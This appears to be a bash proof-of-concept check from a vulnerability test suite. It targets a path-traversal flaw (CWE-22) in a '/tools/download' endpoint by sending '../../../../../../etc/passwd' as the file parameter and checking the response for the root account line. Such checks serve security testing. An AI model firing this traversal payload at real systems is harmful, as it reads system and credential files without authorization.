#!/usr/bin/env bash
# TRAVERSAL-001 (CWE-22): the download filename is joined to a base dir with no
# containment check, so ../ escapes to /etc/passwd.
set -eu
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "file=../../../../../../etc/passwd" "$TARGET/tools/download" \
  | grep -q 'root:.*:0:0'
